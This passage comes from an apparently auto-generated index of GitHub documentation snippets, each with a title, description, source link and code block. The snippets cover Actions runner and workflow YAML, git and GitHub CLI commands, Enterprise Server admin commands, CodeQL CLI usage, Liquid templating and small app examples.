/var/run\n      - name: dind\n        image: docker:dind\n        args:\n          - dockerd\n          - --host=unix:///var/run/docker.sock\n          - --group=$(DOCKER_GROUP_GID)\n        env:\n          - name: DOCKER_GROUP_GID\n            value: \"123\"\n        securityContext:\n          privileged: true\n        volumeMounts:\n          - name: work\n            mountPath: /home/runner/_work\n          - name: dind-sock\n            mountPath: /var/run\n          - name: dind-externals\n            mountPath: /home/runner/externals\n    volumes:\n      - name: work\n        emptyDir: {}\n      - name: dind-sock\n        emptyDir: {}\n      - name: dind-externals\n        emptyDir: {}\n```\n\n----------------------------------------\n\nTITLE: Viewing Push Logs via Command-line using ghe-spokesctl\nDESCRIPTION: This command allows administrators to view a repository's audit log file, which contains push logs, via the command line. It uses `ghe-spokesctl ssh` to connect to the instance and then `cat` to display the audit log file for the specified repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/exploring-user-activity-in-your-enterprise/viewing-push-logs.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-spokesctl ssh --primary OWNER/REPOSITORY -- cat audit_log\n```\n\n----------------------------------------\n\nTITLE: Starting ssh-agent in the background (shell)\nDESCRIPTION: This shell command starts the ssh-agent in the background and sets the environment variables required for SSH to communicate with the agent. The `eval` command executes the output of `ssh-agent -s`, which includes commands to set the SSH_AUTH_SOCK and SSH_AGENT_PID environment variables. This allows subsequent SSH operations to utilize the agent for authentication without needing to enter the passphrase each time.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/command_line/start_ssh_agent.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ eval \"$(ssh-agent -s)\"\n> Agent pid 59566\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Left Whitespace Trim\nDESCRIPTION: This snippet uses the `ifversion` tag and the left whitespace trim character (`{%-`) to remove leading whitespace before the tag.  The GHES version is compared to 2.13.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{%- ifversion ghes > 2.13 %}\n  Alpha\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Ignoring Gemfile.lock in Shell (.gitignore)\nDESCRIPTION: This shell command adds `Gemfile.lock` to the `.gitignore` file, which prevents the file from being tracked by Git.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nGemfile.lock\n```\n\n----------------------------------------\n\nTITLE: Define calculateDaysBetweenDates Function Header (JavaScript)\nDESCRIPTION: This JavaScript function header defines a function named `calculateDaysBetweenDates` which accepts two parameters: `begin` and `end`. It is intended to calculate the number of days between these two dates, presumably date objects or strings that can be parsed into dates.  No implementation is provided in this snippet.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/type-function-header.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nfunction calculateDaysBetweenDates(begin, end) {\n```\n\n----------------------------------------\n\nTITLE: Describing moved_columns_in_project Event Property\nDESCRIPTION: Describes the `previous_column_name` property for the `moved_columns_in_project` event. This property is a string that represents the name of the column an issue or pull request was moved from within a project board.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/issue-event-types.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n`previous_column_name` | `string` | The name of the column the issue was moved from.\n```\n\n----------------------------------------\n\nTITLE: Fetching LFS Objects after Cloning with Git CLI\nDESCRIPTION: This command fetches all {% data variables.large_files.product_name_long %} objects associated with the cloned Git repository.  It ensures that large files managed by {% data variables.large_files.product_name_long %} are also included in the backup. This requires Git and {% data variables.large_files.product_name_long %} to be installed.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/archiving-a-github-repository/backing-up-a-repository.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ngit lfs fetch --all\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering for secret scanning enhancements\nDESCRIPTION: This code snippet checks if the `secret-scanning-enhancements-prs-discussions` feature flag is enabled. If it is, it displays a note indicating that scanning content in pull requests and discussions is currently in public preview.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/secret-scanning/beta-prs-discussions-wikis-scanned.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion secret-scanning-enhancements-prs-discussions %}\n\n> [!NOTE]\n> The scanning of content in pull requests and {% data variables.product.prodname_discussions %} is currently in {% data variables.release-phases.public_preview %} and subject to change.\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Add Gem Dependencies for CI Server\nDESCRIPTION: This Ruby Gemfile specifies the dependencies needed for the CI server application. It includes Sinatra for the web framework, JWT for handling JSON Web Tokens, Octokit for interacting with the GitHub API, Puma as a web server, Rubocop for code linting, Dotenv for managing environment variables, and Git for version control.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\nsource 'http://rubygems.org'\n\ngem 'sinatra', '~> 2.0'\ngem 'jwt', '~> 2.1'\ngem 'octokit', '~> 4.0'\ngem 'puma'\ngem 'rubocop'\ngem 'dotenv'\ngem 'git'\n```\n\n----------------------------------------\n\nTITLE: Error Message Example\nDESCRIPTION: This code snippet shows an example error message encountered when running `ghe-repl-promote` on a replica node that cannot reach the original primary.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/release-notes/2024-11-ghe-repl-promote-primary-down.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nMaintenance mode has been enabled for active replica <REPLICA_HOSTNAME>\n{\"message\": \"No server is currently available to service your request. Sorry about that. Please try resubmitting your request and contact your local GitHub Enterprise site administrator if the problem persists.\"}\njq: error (at :3): Cannot index string with string \"node\"\n```\n\n----------------------------------------\n\nTITLE: Defining GitHub Actions Job to use ARC Runner\nDESCRIPTION: This YAML snippet shows how to define a job in a GitHub Actions workflow that uses an Actions Runner Controller (ARC) runner. The `runs-on` key is set to the name of the runner scale set, which in this example is 'arc-runner-set'. This ensures that the job will be executed on a runner from the specified scale set.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/using-actions-runner-controller-runners-in-a-workflow.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job_name:\n    runs-on: arc-runner-set\n```\n\n----------------------------------------\n\nTITLE: Install Dependencies using npm\nDESCRIPTION: This snippet demonstrates how to install the necessary dependencies for the GitHub App using npm. It includes octokit for interacting with the GitHub API, dotenv for managing environment variables, and smee-client as a dev dependency for forwarding webhooks during development. The `npm init --yes` command is used to create a default `package.json` file, while `node_modules` should be added to .gitignore.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm init --yes\nnpm install octokit\nnpm install dotenv\nnpm install smee-client --save-dev\n```\n\n----------------------------------------\n\nTITLE: GraphQL Signature for Repository Discussion Categories\nDESCRIPTION: This GraphQL signature defines the structure for querying discussion categories within a repository using the `discussionCategories` field. It includes parameters for pagination (`after`, `before`, `first`, `last`). The return type is a `DiscussionCategoryConnection` object.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_4\n\nLANGUAGE: GraphQL\nCODE:\n```\ndiscussionCategories(\n  after: String,\n  before: String,\n  first: Int,\n  last: Int,\n) : DiscussionCategoryConnection!\n```\n\n----------------------------------------\n\nTITLE: Rewriting authors/branches after Team Foundation import (Shell)\nDESCRIPTION: This command rewrites the authors and branches of the imported Team Foundation Version Control repository using a CSV file. It requires the path to the authors map file and the path to the temporary repository. Replace `/PATH/AUTHORS-MAP-FILE.csv` and `/PATH/REPO_NAME.git` with the actual file and repository paths.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-from-other-version-control-systems-with-the-administrative-shell.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngit-import-rewrite --flavor tfs --authors /PATH/AUTHORS-MAP-FILE.csv /PATH/REPO_NAME.git\n```\n\n----------------------------------------\n\nTITLE: Rebuilding Codespace Dev Container with GitHub CLI\nDESCRIPTION: This shell command rebuilds the dev container for a specified GitHub Codespace using the GitHub CLI. It lists available codespaces and prompts the user to select one for rebuilding.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/rebuilding-container-procedures.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace rebuild\n```\n\n----------------------------------------\n\nTITLE: Generating MinIO Access and Secret Keys (Linux Shell)\nDESCRIPTION: This snippet generates random access and secret keys for MinIO using `/dev/urandom`. These keys are used to authenticate with the MinIO server. They are stored as environment variables `MINIO_ACCESS_KEY` and `MINIO_SECRET_KEY`. The `tr`, `fold`, and `head` commands are used to generate a 32-character alphanumeric string.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ export MINIO_ACCESS_KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)\n# this one is actually a secret, so careful\n$ export MINIO_SECRET_KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)\n```\n\n----------------------------------------\n\nTITLE: Querying Organization Info with GraphQL\nDESCRIPTION: This GraphQL query retrieves organization details like login, id, name, and databaseId, using the organization's login name as the input. The `login` variable (String!) is required.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/migration-destination-query.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery(\n  $login: String!\n){\n  organization (login: $login)\n  {\n    login\n    id\n    name\n    databaseId\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Condition Syntax\nDESCRIPTION: This YAML snippet shows how to define conditions in GitLab CI/CD using the `rules` key. It defines a job named `deploy_prod` that will only run if the `CI_COMMIT_BRANCH` variable is equal to \"master\".\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\ndeploy_prod:\n  stage: deploy\n  script:\n    - echo \"Deploy to production server\"\n  rules:\n    - if: '$CI_COMMIT_BRANCH == \"master\"'\n```\n\n----------------------------------------\n\nTITLE: Viewing Detailed Workflow Run Information using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to include job steps in the output of the `gh run view` command using the `-v` or `--verbose` flag.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view RUN_ID --verbose\n```\n\n----------------------------------------\n\nTITLE: HTML Keyboard Shortcut Formatting\nDESCRIPTION: Demonstrates the correct HTML formatting for keyboard shortcuts using the kbd tag.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_16\n\nLANGUAGE: HTML\nCODE:\n```\n<kbd>Command</kbd>+<kbd>B</kbd>\n```\n\n----------------------------------------\n\nTITLE: Searching by Number of Repositories\nDESCRIPTION: This example demonstrates how to search for users based on the number of repositories they own using the `repos` qualifier along with comparison operators.  It allows filtering users who own a specific number, or a range of repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-users.md#_snippet_2\n\nLANGUAGE: none\nCODE:\n```\nrepos:>9000\nbert repos:10..30\n```\n\n----------------------------------------\n\nTITLE: Example Embedding 3D Model HTML Script Tag\nDESCRIPTION: This snippet provides a concrete example of embedding a 3D model hosted on GitHub. It uses the specific URL `https://embed.github.com/view/3d/skalnik/secret-bear-clip/master/stl/clip.stl` to embed the `clip.stl` model. This code is meant to be included within the `<body>` tag of an HTML document.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/working-with-non-code-files.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://embed.github.com/view/3d/skalnik/secret-bear-clip/master/stl/clip.stl\"></script>\n```\n\n----------------------------------------\n\nTITLE: Configure GitHub Actions Workflow Triggers - YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to trigger on three different events: `label`, `push`, and `page_build`. The `label` event is triggered when a label is created. The `push` event is triggered when a push is made to the `main` branch. The `page_build` event is triggered when a push is made to a {% data variables.product.prodname_pages %}-enabled branch.  Each event type can have specific filters defined, such as `types` for `label` and `branches` for `push`.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-multiple-types.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  label:\n    types:\n      - created\n  push:\n    branches:\n      - main\n  page_build:\n```\n\n----------------------------------------\n\nTITLE: Changing Directory to Repository in Shell\nDESCRIPTION: This shell command changes the current working directory to the specified REPOSITORY-NAME.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncd REPOSITORY-NAME\n```\n\n----------------------------------------\n\nTITLE: Defining a Simple Environment for a Job (YAML)\nDESCRIPTION: This snippet demonstrates how to define a simple environment for a job within a GitHub Actions workflow. The `environment` key is used to specify the name of the environment, in this case, 'production'. The `deployment` job will be subject to any rules configured for the `production` environment.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/environment-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Deployment\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps\n```\n\n----------------------------------------\n\nTITLE: Adding Files to Staging Area\nDESCRIPTION: This command adds specified files to the Git staging area, preparing them to be included in the next commit. Replace `FILENAME` with the names of the files you want to stage.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-git-on-github-docs.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ngit add example-new-file.md example-changed-file.md\n```\n\n----------------------------------------\n\nTITLE: Example CODEOWNERS line with multiple owners\nDESCRIPTION: This snippet shows an example CODEOWNERS line where changes to JavaScript files (`*.js`) can be approved by either `@global-owner1` or `@global-owner2` individually.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\n*.js     @global-owner1 @global-owner2\n```\n\n----------------------------------------\n\nTITLE: Setting Extractor Options from JSON File\nDESCRIPTION: This shows the structure of a JSON file used to set extractor options. The file should contain a nested map starting with the `extractor` key, followed by the extractor name, and then the extractor options and their values.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/extractor-options.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n     \"extractor\" : {\n        \"java\": {\n            \"option1\" : \"abc\",\n            \"group1\" : {\n                \"option2\" : [ 102 ]\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Processing Paginated Results with a Block in Octokit\nDESCRIPTION: This snippet demonstrates how to use the `paginate` method with a block to process each page of results. It fetches issues and stops when an issue with \"test\" in the title is found. Only the title and author of each issue are collected until that point.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nissue_data = octokit.paginate(\"GET /repos/{owner}/{repo}/issues\", owner: \"github\", repo: \"docs\", per_page: 100) do |response, done|\n  response.data.map do |issue|\n    if issue.title.include?(\"test\")\n      done.call\n    end\n    { title: issue.title, author: issue.user.login }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Cloning a Repository\nDESCRIPTION: Clones an existing Git repository from a remote URL. Replace `USERNAME` and `REPOSITORY-NAME` with the appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://{% data variables.product.product_url %}/USERNAME/REPOSITORY-NAME\n```\n\n----------------------------------------\n\nTITLE: Export Diagnostic Information\nDESCRIPTION: Exports diagnostic information from a CodeQL database. It requires the database path and output format. This command is experimental and available since v2.12.6.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-export-diagnostics.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database export-diagnostics --format=<format> [--output=<output>] <options>... -- <database>\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with Nested ifversion Statements\nDESCRIPTION: This snippet shows nested `ifversion` statements.  It first checks if `fpt` is true. If not, it renders 'Bravo' and then checks if the GHES version is less than 2.14. If both conditions are true, 'Charlie' is rendered. This allows for complex conditional logic based on multiple version and platform checks.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes < 2.14 %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Commenting out Autobuild step in CodeQL (YAML)\nDESCRIPTION: This snippet demonstrates how to disable the default autobuild step by commenting it out in a CodeQL workflow.  This is useful when manual build steps are preferred or required.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\n    # Autobuild attempts to build any compiled languages.\n    # - name: Autobuild\n    #  uses: {% data reusables.actions.action-codeql-action-autobuild %}\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Anchors in Markdown\nDESCRIPTION: Demonstrates how to create a custom anchor point in a Markdown document using HTML anchor tags. This allows linking to specific sections of the document that don't have their own headings.  The example shows defining an anchor and then creating a link to it.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_7\n\nLANGUAGE: markdown\nCODE:\n```\n# Section Heading\n\nSome body text of this section.\n\n<a name=\"my-custom-anchor-point\"></a>\nSome text I want to provide a direct link to, but which doesn't have its own heading.\n\n(… more content…)\n\n[A link to that custom anchor](#my-custom-anchor-point)\n```\n\n----------------------------------------\n\nTITLE: Example Copilot Chat Query\nDESCRIPTION: This is an example of a query that can be used with GitHub Copilot Chat to understand how a security alert introduces a vulnerability into the code.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/managing-code-scanning-alerts/best-practices-for-participating-in-a-security-campaign.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nExplain how this alert introduces a vulnerability into the code.\n```\n\n----------------------------------------\n\nTITLE: Unique Header Examples: Option 1\nDESCRIPTION: Shows how to use unique H2 and H3 headers with nested content.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_13\n\nLANGUAGE: Markdown\nCODE:\n```\n## Examples  (H2)\n\nTEXT\n\n### Prompts for writing code (H3)\n\nTEXT\n\n### Prompts for writing tests (H3)\n\nTEXT\n```\n\n----------------------------------------\n\nTITLE: Tracking Experiment Success with Dedicated Event\nDESCRIPTION: This TypeScript code snippet showcases how to track experiment success using a dedicated `sendExperimentSuccess` function. It's best used when the experiment can be tracked with a simple boolean event. It imports the `sendExperimentSuccess` function and `EXPERIMENTS` object from their respective modules.\nSOURCE: https://github.com/github/docs/blob/main/src/events/components/experiments/README.md#_snippet_4\n\nLANGUAGE: typescript\nCODE:\n```\nimport { sendExperimentSuccess } from '@/events/components/experiments/experiment-event'\nimport { EXPERIMENTS } from '@/events/components/experiments/experiments'\n\nexport function MyNewComponent() {\n  return (\n    <button onClick={() => {\n      console.log(\"The user did the thing!\")\n      sendExperimentSuccess(EXPERIMENTS.new_button_experiment)\n    }}>\n  )\n}\n```\n\n----------------------------------------\n\nTITLE: Decoding BQRS data\nDESCRIPTION: This command decodes data from a BQRS file. It takes a BQRS file as input and can output the data in various formats such as text, CSV, JSON, or BQRS.  The output is written to standard output by default, but can be redirected to a file using the `--output` option.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/bqrs-decode.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql bqrs decode [--output=<file>] [--result-set=<name>] [--sort-key=<col>[,<col>...]] <options>... -- <file>\n```\n\n----------------------------------------\n\nTITLE: Undoing Last Commit and Modifying File using Git Reset\nDESCRIPTION: This command reverts the last commit but keeps the changes in the working directory. It allows for modifications to the file before recommitting. The '--soft' option ensures that the changes are staged for commit.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/git/reset-head-to-previous-commit-codeblock.md#_snippet_0\n\nLANGUAGE: git\nCODE:\n```\ngit reset --soft HEAD~1\n```\n\n----------------------------------------\n\nTITLE: Handling check_suite events in event_handler route - Ruby\nDESCRIPTION: This code snippet handles the 'check_suite' event within the '/event_handler' route in a Sinatra application. It checks if the action is 'requested' or 'rerequested' and then calls the 'create_check_run' helper method. This logic ensures a new check run is created when a check suite is initially requested or re-requested.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\n    # Get the event type from the HTTP_X_GITHUB_EVENT header\n    case request.env['HTTP_X_GITHUB_EVENT']\n    when 'check_suite'\n      # A new check_suite has been created. Create a new check run with status queued\n      if @payload['action'] == 'requested' || @payload['action'] == 'rerequested'\n        create_check_run\n      end\n      # ADD CHECK_RUN METHOD HERE #\n    end\n```\n\n----------------------------------------\n\nTITLE: APA Citation with Preferred Article\nDESCRIPTION: This is the APA citation example based on the preferred citation defined in the CITATION.cff file.  It contains the correctly formatted citation for the journal article, showing the modified citation based on the `preferred-citation` block.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nLisa, M., & Bot, H. (2021). My awesome research software. Journal Title, 1(1), 1. https://doi.org/10.0000/00000\n```\n\n----------------------------------------\n\nTITLE: Getting Appliance UUID\nDESCRIPTION: This snippet shows how to get UUID of the appliance. This UUID is needed to be removed from the high availability configuration on the new primary in case you don't intend to setup replication.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/initiating-a-failover-to-your-replica-appliance.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ncat /data/user/common/uuid\n```\n\n----------------------------------------\n\nTITLE: Example of a Scraped Record (JSON)\nDESCRIPTION: This is an example of a scraped record, representing a single page from the Docs site.  It includes fields like `objectID` (the permalink), `breadcrumbs`, `title`, `headings`, `content`, `intro`, `toplevel`, and `popularity`. This structure is used for indexing in Elasticsearch.\nSOURCE: https://github.com/github/docs/blob/main/src/search/scripts/scrape/README.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"objectID\":\"/en/actions/creating-actions/about-custom-actions\",\n  \"breadcrumbs\":\"GitHub Actions / Creating actions\",\n  \"title\":\"About custom actions\",\n  \"headings\":\"About custom actions\\nTypes of actions\\n[...]\",\n  \"content\":\"Actions are individual tasks that you can combine to create jobs and customize your workflow. You can create your own actions, [...]\",\n  \"intro\":\"Actions are individual tasks that you can combine to create jobs and customize your workflow. You can create your own actions, or use and customize actions shared by the GitHub community.\",\n  \"toplevel\":\"GitHub Actions\",\n  \"popularity\":0\n}\n```\n\n----------------------------------------\n\nTITLE: Defining GitHub Issue Template\nDESCRIPTION: This YAML snippet defines a GitHub issue template. It includes sections for title, labels, and the body of the issue. The body consists of different input types like markdown, textarea, input fields, dropdowns, and checkboxes to structure user input and guide the issue creation process.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/discussions/discussion-category-forms-sample.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\ntitle: \"[General] \"\nlabels: [\"General Introduction\"]\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        This is text that will show up in the template!\n  - type: textarea\n    id: improvements\n    attributes:\n      label: Top 3 improvements\n      description: \"What are the top 3 improvements we could make to this project?\"\n      value: |\n        1.\n        2.\n        3.\n        ...\n      render: bash\n    validations:\n      required: true\n  - type: markdown\n    attributes:\n      value: |\n        ## Markdown header\n        And some more markdown\n  - type: input\n    id: has-id\n    attributes:\n      label: Suggestions\n      description: A description about suggestions to help you\n    validations:\n      required: true\n  - type: dropdown\n    id: download\n    attributes:\n      label: Which area of this project could be most improved?\n      options:\n        - Documentation\n        - Pull request review time\n        - Bug fix time\n        - Release cadence\n    validations:\n      required: true\n  - type: checkboxes\n    attributes:\n      label: Check that box!\n      options:\n        - label: This one!\n          required: true\n        - label: I won't stop you if you check this one, too\n  - type: markdown\n    attributes:\n      value: |\n        ### The thrilling conclusion\n        _to our template_\n```\n\n----------------------------------------\n\nTITLE: Registering Ephemeral Runner\nDESCRIPTION: Registers a self-hosted runner as ephemeral using the `config.sh` script with the `--ephemeral` parameter. Ephemeral runners are automatically de-registered after processing one job. Requires access to the runner configuration script.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/autoscaling-with-self-hosted-runners.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n./config.sh --url https://github.com/octo-org --token example-token --ephemeral\n```\n\n----------------------------------------\n\nTITLE: Handling Unverified User Email - JSON\nDESCRIPTION: This JSON snippet illustrates the error returned when a user's primary email address is not verified.  The user needs to verify their primary email address on their GitHub account to resolve this error.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/maintaining-oauth-apps/troubleshooting-oauth-app-access-token-request-errors.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"error\": \"unverified_user_email\",\n  \"error_description\": \"The user must have a verified primary email.\",\n  \"error_uri\": \"/apps/managing-oauth-apps/troubleshooting-oauth-app-access-token-request-errors/#unverified_user_email\"\n}\n```\n\n----------------------------------------\n\nTITLE: Defining warnOnImplicitThis in qlpack.yml (YAML)\nDESCRIPTION: This snippet defines a boolean that specifies whether or not the compiler should emit warnings about member predicate calls with implicit `this` call receivers. Defaults to `false` if the `warnOnImplicitThis` property is not defined.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_22\n\nLANGUAGE: YAML\nCODE:\n```\nwarnOnImplicitThis: true\n```\n\n----------------------------------------\n\nTITLE: Configure Repository Cache Settings\nDESCRIPTION: This command configures the repository cache with a cache location, cache domain, and datacenter. It uses the `ghe-repl-node` command with parameters to set the cache location (CACHE-LOCATION), external cache domain (EXTERNAL-CACHE-DOMAIN), and datacenter (REPLICA-DC-NAME).\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-node --cache CACHE-LOCATION --cache-domain EXTERNAL-CACHE-DOMAIN --datacenter REPLICA-DC-NAME\n```\n\n----------------------------------------\n\nTITLE: Resolving Metadata with CodeQL CLI in Shell\nDESCRIPTION: This command resolves and returns key-value metadata pairs from a specified query source file using the CodeQL CLI. The `<file>` parameter is mandatory and specifies the query source file. The `--format` option is included for future compatibility.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/resolve-metadata.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql resolve metadata <options>... -- <file>\n```\n\n----------------------------------------\n\nTITLE: Handling Redirects in Middleware (Pseudo Code)\nDESCRIPTION: This pseudo-code demonstrates how the `handle-redirects.js` middleware works to redirect users based on precompiled redirects. It removes the language part of the URL, looks it up in the redirects object, and if a match is found, redirects the user with the language code put back in.\nSOURCE: https://github.com/github/docs/blob/main/src/redirects/README.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nvar fullPath = '/ja/foo'\nvar newPath = redirects['/foo']\nif (newPath) {\n  redirect('/ja' + newPath)\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Debug Mode for CodeQL Initialization in YAML\nDESCRIPTION: This YAML snippet demonstrates how to enable debug mode in the `init` step of a CodeQL workflow. Setting `debug: true` will cause the CodeQL database to be uploaded as an artifact, allowing for inspection of the scanned source files.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/troubleshooting-code-scanning/fewer-lines-scanned-than-expected.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Initialize CodeQL\n  uses: {% data reusables.actions.action-codeql-action-init %}\n  with:\n    debug: true\n```\n\n----------------------------------------\n\nTITLE: Database Connection Context Manager\nDESCRIPTION: This Python code defines a `Database` class that acts as a context manager for SQLite database connections. The `__enter__` method establishes a connection and returns a cursor, while the `__exit__` method commits transactions, rolls back on error, and closes the connection. This ensures proper database resource management.\nSOURCE: 